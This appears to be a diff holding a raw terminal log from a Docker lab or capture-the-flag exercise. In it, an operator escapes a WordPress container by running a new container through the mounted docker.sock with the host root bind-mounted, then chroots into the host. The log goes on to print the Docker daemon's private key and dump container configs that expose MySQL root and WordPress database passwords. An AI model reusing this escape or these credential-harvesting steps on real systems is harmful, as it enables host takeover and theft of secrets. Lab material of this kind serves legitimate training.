+1 S root      5017     2  0  60 -20 -     0 -      02:29 ?        00:00:00 [kworker/u3:2]
+1 S root      5163     2  0  80   0 -     0 -      02:35 ?        00:00:00 [kworker/0:1]
+0 S root      5217  1626  0  80   0 -  2041 -      02:39 ?        00:00:00 bash
+0 S root      5360  5217  0  80   0 - 173910 -     03:06 ?        00:00:00 docker -H unix:///var/run/docker.sock run --rm -it -v /:/host wordpress chroot /host bash
+1 S root      5374     2  0  80   0 -     0 -      03:06 ?        00:00:00 [kworker/0:2]
+4 S root      5377   845  0  80   0 - 51827 -      03:06 ?        00:00:00 docker-containerd-shim 358d18a69d22e76d7c5752ad55c5b3318e7d27944bdf8a1dc68d897207764f0c /var/run/docker/libcontainerd/358d18a69d22e76d7c5752ad55c5b3318e7d27944bdf8a1dc68d897207764f0c docker-runc
+4 S root      5392  5377  0  80   0 -  4547 -      03:06 ?        00:00:00 bash
+0 R root      5438  5392  0  80   0 -  3893 -      03:11 ?        00:00:00 ps -ealwf
+root@358d18a69d22:/# 
+
+
+
+root@358d18a69d22:/# cat /etc/docker/daemon.json
+cat: /etc/docker/daemon.json: No such file or directory
+
+
+root@358d18a69d22:/# ls /etc/docker
+key.json
+
+
+root@358d18a69d22:/# cat /etc/docker/key.json
+{"crv":"P-256","d":"t5kFK0d8i1ci80_ObQlT3Mik-1N0hV7DNBbO9pmd-I4","kid":"GLP6:OT5L:SYVE:BX54:BVOU:BQQ3:CQID:KXTQ:ERTV:4JH6:QL7T:OTLL","kty":"EC","x":"1wkEIm5bX6dsP27hlzpfNVsqmrydVhxiyHRAC4zX2Ok","y":"lOBobaK7fI5fMsszaZYscNMC_3dNdEIvspGF9MfBffE"}root@358d18a69d22:/# find / -name daemon.json
+
+
+
+root@358d18a69d22:/# find / -name config.json
+
+/run/docker/libcontainerd/358d18a69d22e76d7c5752ad55c5b3318e7d27944bdf8a1dc68d897207764f0c/config.json
+/run/docker/libcontainerd/13f0a3bb27069c58d328761a5202423bee3cdcdade0dfd4a9648d30d3ac20215/config.json
+/run/docker/libcontainerd/b90babce10373b0d226169d8ccaa256aaf457fa70d6f392159ae8e331f967106/config.json
+/run/docker/libcontainerd/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669/config.json
+/var/lib/docker/aufs/mnt/e8e18a6ad9e719e836c682fbbb2e9faeec4d55654a24c4fb65b7d2f8be8f2583/root/.forever/config.json
+/var/lib/docker/aufs/mnt/e8e18a6ad9e719e836c682fbbb2e9faeec4d55654a24c4fb65b7d2f8be8f2583/src/node_modules/utile/test/fixtures/read-json-file/config.json
+/var/lib/docker/aufs/mnt/e8e18a6ad9e719e836c682fbbb2e9faeec4d55654a24c4fb65b7d2f8be8f2583/src/node_modules/flatiron/scaffolds/cli/config/config.json
+/var/lib/docker/aufs/mnt/e8e18a6ad9e719e836c682fbbb2e9faeec4d55654a24c4fb65b7d2f8be8f2583/src/node_modules/flatiron/scaffolds/http/config/config.json
+/var/lib/docker/aufs/diff/7f5c81622bb6145ea85940b183d30a6276f89df6378394fa0e6c6b8800e95e56/src/node_modules/utile/test/fixtures/read-json-file/config.json
+/var/lib/docker/aufs/diff/7f5c81622bb6145ea85940b183d30a6276f89df6378394fa0e6c6b8800e95e56/src/node_modules/flatiron/scaffolds/cli/config/config.json
+/var/lib/docker/aufs/diff/7f5c81622bb6145ea85940b183d30a6276f89df6378394fa0e6c6b8800e95e56/src/node_modules/flatiron/scaffolds/http/config/config.json
+/var/lib/docker/aufs/diff/e8e18a6ad9e719e836c682fbbb2e9faeec4d55654a24c4fb65b7d2f8be8f2583/root/.forever/config.json
+
+root@358d18a69d22:/# cat /var/lib/docker/aufs/mnt/e8e18a6ad9e719e836c682fbbb2e9faeec4d55654a24c4fb65b7d2f8be8f2583/root/.forever/config.json
+{
+  "root": "/root/.forever",
+  "pidPath": "/root/.forever/pids",
+  "sockPath": "/root/.forever/sock",
+  "loglength": 100,
+  "logstream": false,
+  "columns": [
+    "uid",
+    "command",
+    "script",
+    "forever",
+    "pid",
+    "id",
+    "logfile",
+    "uptime"
+  ]
+
+}root@358d18a69d22:/# cat /var/lib/docker/aufs/diff/e8e18a6ad9e719e836c682fbbb2e9faeec4d55654a24c4fb65b7d2f8be8f2583/root/.forever/config.json
+{
+  "root": "/root/.forever",
+  "pidPath": "/root/.forever/pids",
+  "sockPath": "/root/.forever/sock",
+  "loglength": 100,
+  "logstream": false,
+  "columns": [
+    "uid",
+    "command",
+    "script",
+    "forever",
+    "pid",
+    "id",
+    "logfile",
+    "uptime"
+  ]
+}
+
+root@358d18a69d22:/# cat /run/docker/libcontainerd/358d18a69d22e76d7c5752ad55c5b3318e7d27944bdf8a1dc68d897207764f0c/config.json
+
+{"ociVersion":"1.0.0-rc5","platform":{"os":"linux","arch":"amd64"},"process":{"terminal":true,"consoleSize":{"height":0,"width":0},"user":{"uid":0,"gid":0},"args":["docker-entrypoint.sh","chroot","/host","bash"],"env":["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","HOSTNAME=358d18a69d22","TERM=xterm","PHPIZE_DEPS=autoconf \t\tdpkg-dev \t\tfile \t\tg++ \t\tgcc \t\tlibc-dev \t\tlibpcre3-dev \t\tmake \t\tpkg-config \t\tre2c","PHP_INI_DIR=/usr/local/etc/php","APACHE_CONFDIR=/etc/apache2","APACHE_ENVVARS=/etc/apache2/envvars","PHP_EXTRA_BUILD_DEPS=apache2-dev","PHP_EXTRA_CONFIGURE_ARGS=--with-apxs2","PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2","PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2","PHP_LDFLAGS=-Wl,-O1 -Wl,--hash-style=both -pie","GPG_KEYS=0BD78B5F97500D450838F95DFE857D9A90D90EC1 6E4F6AB321FDC07F2C332E3AC2BF0BC433CFC8B3","PHP_VERSION=5.6.31","PHP_URL=https://secure.php.net/get/php-5.6.31.tar.xz/from/this/mirror","PHP_ASC_URL=https://secure.php.net/get/php-5.6.31.tar.xz.asc/from/this/mirror","PHP_SHA256=c464af61240a9b7729fabe0314cdbdd5a000a4f0c9bd201f89f8628732fe4ae4","PHP_MD5=","WORDPRESS_VERSION=4.8.1","WORDPRESS_SHA1=5376cf41403ae26d51ca55c32666ef68b10e35a4"],"cwd":"/var/www/html","capabilities":{"bounding":["CAP_CHOWN","CAP_DAC_OVERRIDE","CAP_FSETID","CAP_FOWNER","CAP_MKNOD","CAP_NET_RAW","CAP_SETGID","CAP_SETUID","CAP_SETFCAP","CAP_SETPCAP","CAP_NET_BIND_SERVICE","CAP_SYS_CHROOT","CAP_KILL","CAP_AUDIT_WRITE"],"effective":["CAP_CHOWN","CAP_DAC_OVERRIDE","CAP_FSETID","CAP_FOWNER","CAP_MKNOD","CAP_NET_RAW","CAP_SETGID","CAP_SETUID","CAP_SETFCAP","CAP_SETPCAP","CAP_NET_BIND_SERVICE","CAP_SYS_CHROOT","CAP_KILL","CAP_AUDIT_WRITE"],"inheritable":["CAP_CHOWN","CAP_DAC_OVERRIDE","CAP_FSETID","CAP_FOWNER","CAP_MKNOD","CAP_NET_RAW","CAP_SETGID","CAP_SETUID","CAP_SETFCAP","CAP_SETPCAP","CAP_NET_BIND_SERVICE","CAP_SYS_CHROOT","CAP_KILL","CAP_AUDIT_WRITE"],"permitted":["CAP_CHOWN","CAP_DAC_OVERRIDE","CAP_FSETID","CAP_FOWNER","CAP_MKNOD","CAP_NET_RAW","CAP_SETGID","CAP_SETUID","CAP_SETFCAP","CAP_SETPCAP","CAP_NET_BIND_SERVICE","CAP_SYS_CHROOT","CAP_KILL","CAP_AUDIT_WRITE"]},"apparmorProfile":"docker-default"},"root":{"path":"/var/lib/docker/aufs/mnt/c11cdebdc9ab659024e6905607af335e1c78e7f3a1deb57f9cd65a905732659d"},"hostname":"358d18a69d22","mounts":[{"destination":"/proc","type":"proc","source":"proc","options":["nosuid","noexec","nodev"]},{"destination":"/dev","type":"tmpfs","source":"tmpfs","options":["nosuid","strictatime","mode=755"]},{"destination":"/dev/pts","type":"devpts","source":"devpts","options":["nosuid","noexec","newinstance","ptmxmode=0666","mode=0620","gid=5"]},{"destination":"/sys","type":"sysfs","source":"sysfs","options":["nosuid","noexec","nodev","ro"]},{"destination":"/sys/fs/cgroup","type":"cgroup","source":"cgroup","options":["ro","nosuid","noexec","nodev"]},{"destination":"/dev/mqueue","type":"mqueue","source":"mqueue","options":["nosuid","noexec","nodev"]},{"destination":"/host","type":"bind","source":"/","options":["rbind","rprivate"]},{"destination":"/etc/resolv.conf","type":"bind","source":"/var/lib/docker/containers/358d18a69d22e76d7c5752ad55c5b3318e7d27944bdf8a1dc68d897207764f0c/resolv.conf","options":["rbind","rprivate"]},{"destination":"/etc/hostname","type":"bind","source":"/var/lib/docker/containers/358d18a69d22e76d7c5752ad55c5b3318e7d27944bdf8a1dc68d897207764f0c/hostname","options":["rbind","rprivate"]},{"destination":"/etc/hosts","type":"bind","source":"/var/lib/docker/containers/358d18a69d22e76d7c5752ad55c5b3318e7d27944bdf8a1dc68d897207764f0c/hosts","options":["rbind","rprivate"]},{"destination":"/dev/shm","type":"bind","source":"/var/lib/docker/containers/358d18a69d22e76d7c5752ad55c5b3318e7d27944bdf8a1dc68d897207764f0c/shm","options":["rbind","rprivate"]},{"destination":"/var/www/html","type":"bind","source":"/var/lib/docker/volumes/d6b95d4f1010c419f09fedb6f939863c77093d94990bbc2d123edb0046ffeb72/_data","options":["rbind"]}],"hooks":{"prestart":[{"path":"/usr/bin/dockerd","args":["libnetwork-setkey","358d18a69d22e76d7c5752ad55c5b3318e7d27944bdf8a1dc68d897207764f0c","8831920e6a8fbe776fb00c1a51405fc7acbf1a9def6b8c908c072559618be646"]}]},"linux":{"resources":{"devices":[{"allow":false,"access":"rwm"},{"allow":true,"type":"c","major":1,"minor":5,"access":"rwm"},{"allow":true,"type":"c","major":1,"minor":3,"access":"rwm"},{"allow":true,"type":"c","major":1,"minor":9,"access":"rwm"},{"allow":true,"type":"c","major":1,"minor":8,"access":"rwm"},{"allow":true,"type":"c","major":5,"minor":0,"access":"rwm"},{"allow":true,"type":"c","major":5,"minor":1,"access":"rwm"},{"allow":false,"type":"c","major":10,"minor":229,"access":"rwm"}],"disableOOMKiller":false,"oomScoreAdj":0,"memory":{"swappiness":18446744073709551615},"cpu":{"shares":0},"pids":{"limit":0},"blockIO":{"blkioWeight":0}},"cgroupsPath":"/docker/358d18a69d22e76d7c5752ad55c5b3318e7d27944bdf8a1dc68d897207764f0c","namespaces":[{"type":"mount"},{"type":"network"},{"type":"uts"},{"type":"pid"},{"type":"ipc"}],"maskedPaths":["/proc/kcore","/proc/latency_stats","/proc/timer_list","/proc/timer_stats","/proc/sched_debug","/sys/firmware"],"readonlyPaths":["/proc/asound","/proc/bus","/proc/fs","/proc/irq","/proc/sys","/proc/sysrq-trigger"]}}
+
+root@358d18a69d22:/# 
+
+root@358d18a69d22:/# cat /run/docker/libcontainerd/13f0a3bb27069c58d328761a5202423bee3cdcdade0dfd4a9648d30d3ac20215/config.json
+{"ociVersion":"1.0.0-rc5","platform":{"os":"linux","arch":"amd64"},"process":{"consoleSize":{"height":0,"width":0},"user":{"uid":0,"gid":0},"args":["docker-entrypoint.sh","mysqld"],"env":["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","HOSTNAME=13f0a3bb2706","MYSQL_ROOT_PASSWORD=Peaches123","MYSQL_PASSWORD=WordPressISBest","MYSQL_USER=wordpress","MYSQL_DATABASE=wordpress","affinity:container==49e27424f6230d3cafb3377505e99838fb825c3002c3e3275c4d442737723f1a","GOSU_VERSION=1.7","MYSQL_MAJOR=5.7","MYSQL_VERSION=5.7.19-1debian8"],"cwd":"/","capabilities":{"bounding":["CAP_CHOWN","CAP_DAC_OVERRIDE","CAP_FSETID","CAP_FOWNER","CAP_MKNOD","CAP_NET_RAW","CAP_SETGID","CAP_SETUID","CAP_SETFCAP","CAP_SETPCAP","CAP_NET_BIND_SERVICE","CAP_SYS_CHROOT","CAP_KILL","CAP_AUDIT_WRITE"],"effective":["CAP_CHOWN","CAP_DAC_OVERRIDE","CAP_FSETID","CAP_FOWNER","CAP_MKNOD","CAP_NET_RAW","CAP_SETGID","CAP_SETUID","CAP_SETFCAP","CAP_SETPCAP","CAP_NET_BIND_SERVICE","CAP_SYS_CHROOT","CAP_KILL","CAP_AUDIT_WRITE"],"inheritable":["CAP_CHOWN","CAP_DAC_OVERRIDE","CAP_FSETID","CAP_FOWNER","CAP_MKNOD","CAP_NET_RAW","CAP_SETGID","CAP_SETUID","CAP_SETFCAP","CAP_SETPCAP","CAP_NET_BIND_SERVICE","CAP_SYS_CHROOT","CAP_KILL","CAP_AUDIT_WRITE"],"permitted":["CAP_CHOWN","CAP_DAC_OVERRIDE","CAP_FSETID","CAP_FOWNER","CAP_MKNOD","CAP_NET_RAW","CAP_SETGID","CAP_SETUID","CAP_SETFCAP","CAP_SETPCAP","CAP_NET_BIND_SERVICE","CAP_SYS_CHROOT","CAP_KILL","CAP_AUDIT_WRITE"]},"apparmorProfile":"docker-default"},"root":{"path":"/var/lib/docker/aufs/mnt/c419eef9c248b7b87e0f04e2879f22846bab9484214006807fb392e5aa26eb11"},"hostname":"13f0a3bb2706","mounts":[{"destination":"/proc","type":"proc","source":"proc","options":["nosuid","noexec","nodev"]},{"destination":"/dev","type":"tmpfs","source":"tmpfs","options":["nosuid","strictatime","mode=755"]},{"destination":"/dev/pts","type":"devpts","source":"devpts","options":["nosuid","noexec","newinstance","ptmxmode=0666","mode=0620","gid=5"]},{"destination":"/sys","type":"sysfs","source":"sysfs","options":["nosuid","noexec","nodev","ro"]},{"destination":"/sys/fs/cgroup","type":"cgroup","source":"cgroup","options":["ro","nosuid","noexec","nodev"]},{"destination":"/dev/mqueue","type":"mqueue","source":"mqueue","options":["nosuid","noexec","nodev"]},{"destination":"/etc/resolv.conf","type":"bind","source":"/var/lib/docker/containers/13f0a3bb27069c58d328761a5202423bee3cdcdade0dfd4a9648d30d3ac20215/resolv.conf","options":["rbind","rprivate"]},{"destination":"/etc/hostname","type":"bind","source":"/var/lib/docker/containers/13f0a3bb27069c58d328761a5202423bee3cdcdade0dfd4a9648d30d3ac20215/hostname","options":["rbind","rprivate"]},{"destination":"/etc/hosts","type":"bind","source":"/var/lib/docker/containers/13f0a3bb27069c58d328761a5202423bee3cdcdade0dfd4a9648d30d3ac20215/hosts","options":["rbind","rprivate"]},{"destination":"/dev/shm","type":"bind","source":"/var/lib/docker/containers/13f0a3bb27069c58d328761a5202423bee3cdcdade0dfd4a9648d30d3ac20215/shm","options":["rbind","rprivate"]},{"destination":"/var/lib/mysql","type":"bind","source":"/var/lib/docker/volumes/content_db_data/_data","options":["rbind"]},{"destination":"/var/run/docker.sock","type":"bind","source":"/var/run/docker.sock","options":["rbind","rprivate"]}],"hooks":{"prestart":[{"path":"/usr/bin/dockerd","args":["libnetwork-setkey","13f0a3bb27069c58d328761a5202423bee3cdcdade0dfd4a9648d30d3ac20215","8831920e6a8fbe776fb00c1a51405fc7acbf1a9def6b8c908c072559618be646"]}]},"linux":{"resources":{"devices":[{"allow":false,"access":"rwm"},{"allow":true,"type":"c","major":1,"minor":5,"access":"rwm"},{"allow":true,"type":"c","major":1,"minor":3,"access":"rwm"},{"allow":true,"type":"c","major":1,"minor":9,"access":"rwm"},{"allow":true,"type":"c","major":1,"minor":8,"access":"rwm"},{"allow":true,"type":"c","major":5,"minor":0,"access":"rwm"},{"allow":true,"type":"c","major":5,"minor":1,"access":"rwm"},{"allow":false,"type":"c","major":10,"minor":229,"access":"rwm"}],"disableOOMKiller":false,"oomScoreAdj":0,"memory":{"swappiness":18446744073709551615},"cpu":{"shares":0},"pids":{"limit":0},"blockIO":{"blkioWeight":0}},"cgroupsPath":"/docker/13f0a3bb27069c58d328761a5202423bee3cdcdade0dfd4a9648d30d3ac20215","namespaces":[{"type":"mount"},{"type":"network"},{"type":"uts"},{"type":"pid"},{"type":"ipc"}],"maskedPaths":["/proc/kcore","/proc/latency_stats","/proc/timer_list","/proc/timer_stats","/proc/sched_debug","/sys/firmware"],"readonlyPaths":["/proc/asound","/proc/bus","/proc/fs","/proc/irq","/proc/sys","/proc/sysrq-trigger"]}}
+
+root@358d18a69d22:/# 
+
+root@358d18a69d22:/# cat /run/docker/libcontainerd/b90babce10373b0d226169d8ccaa256aaf457fa70d6f392159ae8e331f967106/config.json
+
+{"ociVersion":"1.0.0-rc5","platform":{"os":"linux","arch":"amd64"},"process":{"consoleSize":{"height":0,"width":0},"user":{"uid":0,"gid":0,"additionalGids":[0,1,2,3,4,6,10,11,20,26,27]},"args":["npm","start"],"env":["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","HOSTNAME=b90babce1037","AUTH_MECHANISM=noAuth","CONTAINER=content_db_1","CONTAINER_SHELL=bash","KEYPATH=./id_rsa","PORT=22","HTTP_ENABLED=true","HTTP_PORT=8022"],"cwd":"/src","capabilities":{"bounding":["CAP_CHOWN","CAP_DAC_OVERRIDE","CAP_FSETID","CAP_FOWNER","CAP_MKNOD","CAP_NET_RAW","CAP_SETGID","CAP_SETUID","CAP_SETFCAP","CAP_SETPCAP","CAP_NET_BIND_SERVICE","CAP_SYS_CHROOT","CAP_KILL","CAP_AUDIT_WRITE"],"effective":["CAP_CHOWN","CAP_DAC_OVERRIDE","CAP_FSETID","CAP_FOWNER","CAP_MKNOD","CAP_NET_RAW","CAP_SETGID","CAP_SETUID","CAP_SETFCAP","CAP_SETPCAP","CAP_NET_BIND_SERVICE","CAP_SYS_CHROOT","CAP_KILL","CAP_AUDIT_WRITE"],"inheritable":["CAP_CHOWN","CAP_DAC_OVERRIDE","CAP_FSETID","CAP_FOWNER","CAP_MKNOD","CAP_NET_RAW","CAP_SETGID","CAP_SETUID","CAP_SETFCAP","CAP_SETPCAP","CAP_NET_BIND_SERVICE","CAP_SYS_CHROOT","CAP_KILL","CAP_AUDIT_WRITE"],"permitted":["CAP_CHOWN","CAP_DAC_OVERRIDE","CAP_FSETID","CAP_FOWNER","CAP_MKNOD","CAP_NET_RAW","CAP_SETGID","CAP_SETUID","CAP_SETFCAP","CAP_SETPCAP","CAP_NET_BIND_SERVICE","CAP_SYS_CHROOT","CAP_KILL","CAP_AUDIT_WRITE"]},"apparmorProfile":"docker-default"},"root":{"path":"/var/lib/docker/aufs/mnt/e8e18a6ad9e719e836c682fbbb2e9faeec4d55654a24c4fb65b7d2f8be8f2583"},"hostname":"b90babce1037","mounts":[{"destination":"/proc","type":"proc","source":"proc","options":["nosuid","noexec","nodev"]},{"destination":"/dev","type":"tmpfs","source":"tmpfs","options":["nosuid","strictatime","mode=755"]},{"destination":"/dev/pts","type":"devpts","source":"devpts","options":["nosuid","noexec","newinstance","ptmxmode=0666","mode=0620","gid=5"]},{"destination":"/sys","type":"sysfs","source":"sysfs","options":["nosuid","noexec","nodev","ro"]},{"destination":"/sys/fs/cgroup","type":"cgroup","source":"cgroup","options":["ro","nosuid","noexec","nodev"]},{"destination":"/dev/mqueue","type":"mqueue","source":"mqueue","options":["nosuid","noexec","nodev"]},{"destination":"/etc/resolv.conf","type":"bind","source":"/var/lib/docker/containers/b90babce10373b0d226169d8ccaa256aaf457fa70d6f392159ae8e331f967106/resolv.conf","options":["rbind","rprivate"]},{"destination":"/etc/hostname","type":"bind","source":"/var/lib/docker/containers/b90babce10373b0d226169d8ccaa256aaf457fa70d6f392159ae8e331f967106/hostname","options":["rbind","rprivate"]},{"destination":"/etc/hosts","type":"bind","source":"/var/lib/docker/containers/b90babce10373b0d226169d8ccaa256aaf457fa70d6f392159ae8e331f967106/hosts","options":["rbind","rprivate"]},{"destination":"/dev/shm","type":"bind","source":"/var/lib/docker/containers/b90babce10373b0d226169d8ccaa256aaf457fa70d6f392159ae8e331f967106/shm","options":["rbind","rprivate"]},{"destination":"/var/run/docker.sock","type":"bind","source":"/var/run/docker.sock","options":["rbind","rprivate"]}],"hooks":{"prestart":[{"path":"/usr/bin/dockerd","args":["libnetwork-setkey","b90babce10373b0d226169d8ccaa256aaf457fa70d6f392159ae8e331f967106","8831920e6a8fbe776fb00c1a51405fc7acbf1a9def6b8c908c072559618be646"]}]},"linux":{"resources":{"devices":[{"allow":false,"access":"rwm"},{"allow":true,"type":"c","major":1,"minor":5,"access":"rwm"},{"allow":true,"type":"c","major":1,"minor":3,"access":"rwm"},{"allow":true,"type":"c","major":1,"minor":9,"access":"rwm"},{"allow":true,"type":"c","major":1,"minor":8,"access":"rwm"},{"allow":true,"type":"c","major":5,"minor":0,"access":"rwm"},{"allow":true,"type":"c","major":5,"minor":1,"access":"rwm"},{"allow":false,"type":"c","major":10,"minor":229,"access":"rwm"}],"disableOOMKiller":false,"oomScoreAdj":0,"memory":{"swappiness":18446744073709551615},"cpu":{"shares":0},"pids":{"limit":0},"blockIO":{"blkioWeight":0}},"cgroupsPath":"/docker/b90babce10373b0d226169d8ccaa256aaf457fa70d6f392159ae8e331f967106","namespaces":[{"type":"mount"},{"type":"network"},{"type":"uts"},{"type":"pid"},{"type":"ipc"}],"maskedPaths":["/proc/kcore","/proc/latency_stats","/proc/timer_list","/proc/timer_stats","/proc/sched_debug","/sys/firmware"],"readonlyPaths":["/proc/asound","/proc/bus","/proc/fs","/proc/irq","/proc/sys","/proc/sysrq-trigger"]}}
+
+root@358d18a69d22:/# 
+
+root@358d18a69d22:/# cat /run/docker/libcontainerd/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669/config.json
+
+{"ociVersion":"1.0.0-rc5","platform":{"os":"linux","arch":"amd64"},"process":{"consoleSize":{"height":0,"width":0},"user":{"uid":0,"gid":0},"args":["docker-entrypoint.sh","apache2-foreground"],"env":["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","HOSTNAME=8f4bca8ef241","affinity:container==d7927efe25477e1c012ff12b8427f0142a7baafb399ef5095819881a05030820","WORDPRESS_DB_HOST=db:3306","WORDPRESS_DB_USER=wordpress","WORDPRESS_DB_PASSWORD=WordPressISBest","PHPIZE_DEPS=autoconf \t\tdpkg-dev \t\tfile \t\tg++ \t\tgcc \t\tlibc-dev \t\tlibpcre3-dev \t\tmake \t\tpkg-config \t\tre2c","PHP_INI_DIR=/usr/local/etc/php","APACHE_CONFDIR=/etc/apache2","APACHE_ENVVARS=/etc/apache2/envvars","PHP_EXTRA_BUILD_DEPS=apache2-dev","PHP_EXTRA_CONFIGURE_ARGS=--with-apxs2","PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2","PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2","PHP_LDFLAGS=-Wl,-O1 -Wl,--hash-style=both -pie","GPG_KEYS=0BD78B5F97500D450838F95DFE857D9A90D90EC1 6E4F6AB321FDC07F2C332E3AC2BF0BC433CFC8B3","PHP_VERSION=5.6.31","PHP_URL=https://secure.php.net/get/php-5.6.31.tar.xz/from/this/mirror","PHP_ASC_URL=https://secure.php.net/get/php-5.6.31.tar.xz.asc/from/this/mirror","PHP_SHA256=c464af61240a9b7729fabe0314cdbdd5a000a4f0c9bd201f89f8628732fe4ae4","PHP_MD5=","WORDPRESS_VERSION=4.8.1","WORDPRESS_SHA1=5376cf41403ae26d51ca55c32666ef68b10e35a4"],"cwd":"/var/www/html","capabilities":{"bounding":["CAP_CHOWN","CAP_DAC_OVERRIDE","CAP_FSETID","CAP_FOWNER","CAP_MKNOD","CAP_NET_RAW","CAP_SETGID","CAP_SETUID","CAP_SETFCAP","CAP_SETPCAP","CAP_NET_BIND_SERVICE","CAP_SYS_CHROOT","CAP_KILL","CAP_AUDIT_WRITE"],"effective":["CAP_CHOWN","CAP_DAC_OVERRIDE","CAP_FSETID","CAP_FOWNER","CAP_MKNOD","CAP_NET_RAW","CAP_SETGID","CAP_SETUID","CAP_SETFCAP","CAP_SETPCAP","CAP_NET_BIND_SERVICE","CAP_SYS_CHROOT","CAP_KILL","CAP_AUDIT_WRITE"],"inheritable":["CAP_CHOWN","CAP_DAC_OVERRIDE","CAP_FSETID","CAP_FOWNER","CAP_MKNOD","CAP_NET_RAW","CAP_SETGID","CAP_SETUID","CAP_SETFCAP","CAP_SETPCAP","CAP_NET_BIND_SERVICE","CAP_SYS_CHROOT","CAP_KILL","CAP_AUDIT_WRITE"],"permitted":["CAP_CHOWN","CAP_DAC_OVERRIDE","CAP_FSETID","CAP_FOWNER","CAP_MKNOD","CAP_NET_RAW","CAP_SETGID","CAP_SETUID","CAP_SETFCAP","CAP_SETPCAP","CAP_NET_BIND_SERVICE","CAP_SYS_CHROOT","CAP_KILL","CAP_AUDIT_WRITE"]},"apparmorProfile":"docker-default"},"root":{"path":"/var/lib/docker/aufs/mnt/5bdaac5b00fbc2e0111d6c541e12d5406a3d618a1eebb6ee6aa7ef7579f5a2f6"},"hostname":"8f4bca8ef241","mounts":[{"destination":"/proc","type":"proc","source":"proc","options":["nosuid","noexec","nodev"]},{"destination":"/dev","type":"tmpfs","source":"tmpfs","options":["nosuid","strictatime","mode=755"]},{"destination":"/dev/pts","type":"devpts","source":"devpts","options":["nosuid","noexec","newinstance","ptmxmode=0666","mode=0620","gid=5"]},{"destination":"/sys","type":"sysfs","source":"sysfs","options":["nosuid","noexec","nodev","ro"]},{"destination":"/sys/fs/cgroup","type":"cgroup","source":"cgroup","options":["ro","nosuid","noexec","nodev"]},{"destination":"/dev/mqueue","type":"mqueue","source":"mqueue","options":["nosuid","noexec","nodev"]},{"destination":"/etc/resolv.conf","type":"bind","source":"/var/lib/docker/containers/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669/resolv.conf","options":["rbind","rprivate"]},{"destination":"/etc/hostname","type":"bind","source":"/var/lib/docker/containers/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669/hostname","options":["rbind","rprivate"]},{"destination":"/etc/hosts","type":"bind","source":"/var/lib/docker/containers/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669/hosts","options":["rbind","rprivate"]},{"destination":"/dev/shm","type":"bind","source":"/var/lib/docker/containers/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669/shm","options":["rbind","rprivate"]},{"destination":"/var/www/html","type":"bind","source":"/var/lib/docker/volumes/37be688c5c2e862bae0bef8f12172f2df59adc2e8ee7594e21f48f299ad8e867/_data","options":["rbind"]}],"hooks":{"prestart":[{"path":"/usr/bin/dockerd","args":["libnetwork-setkey","8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669","8831920e6a8fbe776fb00c1a51405fc7acbf1a9def6b8c908c072559618be646"]}]},"linux":{"resources":{"devices":[{"allow":false,"access":"rwm"},{"allow":true,"type":"c","major":1,"minor":5,"access":"rwm"},{"allow":true,"type":"c","major":1,"minor":3,"access":"rwm"},{"allow":true,"type":"c","major":1,"minor":9,"access":"rwm"},{"allow":true,"type":"c","major":1,"minor":8,"access":"rwm"},{"allow":true,"type":"c","major":5,"minor":0,"access":"rwm"},{"allow":true,"type":"c","major":5,"minor":1,"access":"rwm"},{"allow":false,"type":"c","major":10,"minor":229,"access":"rwm"}],"disableOOMKiller":false,"oomScoreAdj":0,"memory":{"swappiness":18446744073709551615},"cpu":{"shares":0},"pids":{"limit":0},"blockIO":{"blkioWeight":0}},"cgroupsPath":"/docker/8f4bca8ef241501721a6d88b3c1a9b7432f19b2d4b389a11bfe68b770366a669","namespaces":[{"type":"mount"},{"type":"network"},{"type":"uts"},{"type":"pid"},{"type":"ipc"}],"maskedPaths":["/proc/kcore","/proc/latency_stats","/proc/timer_list","/proc/timer_stats","/proc/sched_debug","/sys/firmware"],"readonlyPaths":["/proc/asound","/proc/bus","/proc/fs","/proc/irq","/proc/sys","/proc/sysrq-trigger"]}}
+root@358d18a69d22:/# 
+
+root@358d18a69d22:/# cat /var/lib/docker/aufs/mnt/e8e18a6ad9e719e836c682fbbb2e9faeec4d55654a24c4fb65b7d2f8be8f2583/src/node_modules/utile/test/fixtures/read-json-file/config.json
+{
+  "hello": "World",
+  "I am": ["the utile module"],
+  "thisMakesMe": {
+    "really": 1337,
+    "right?": true
+  }
+}
+
+root@358d18a69d22:/# cat /var/lib/docker/aufs/mnt/e8e18a6ad9e719e836c682fbbb2e9faeec4d55654a24c4fb65b7d2f8be8f2583/src/node_modules/flatiron/scaffolds/cli/config/config.json
+{
+}
+
+root@358d18a69d22:/# cat /var/lib/docker/aufs/mnt/e8e18a6ad9e719e836c682fbbb2e9faeec4d55654a24c4fb65b7d2f8be8f2583/src/node_modules/flatiron/scaffolds/http/config/config.json
+{
+}
+
+root@358d18a69d22:/# cat /var/lib/docker/aufs/diff/7f5c81622bb6145ea85940b183d30a6276f89df6378394fa0e6c6b8800e95e56/src/node_modules/utile/test/fixtures/read-json-file/config.json
+{
+  "hello": "World",
+  "I am": ["the utile module"],
+  "thisMakesMe": {
+    "really": 1337,
+    "right?": true
+  }
+}
+
+root@358d18a69d22:/# cat /var/lib/docker/aufs/diff/7f5c81622bb6145ea85940b183d30a6276f89df6378394fa0e6c6b8800e95e56/src/node_modules/flatiron/scaffolds/cli/config/config.json
+{
+}
+
+root@358d18a69d22:/# cat /var/lib/docker/aufs/diff/7f5c81622bb6145ea85940b183d30a6276f89df6378394fa0e6c6b8800e95e56/src/node_modules/flatiron/scaffolds/http/config/config.json
+{
+}
+
+root@358d18a69d22:/# 
+
+
+
+****************************************** 'Easy' mode ************************************************
+
+
+=======================================================================================================
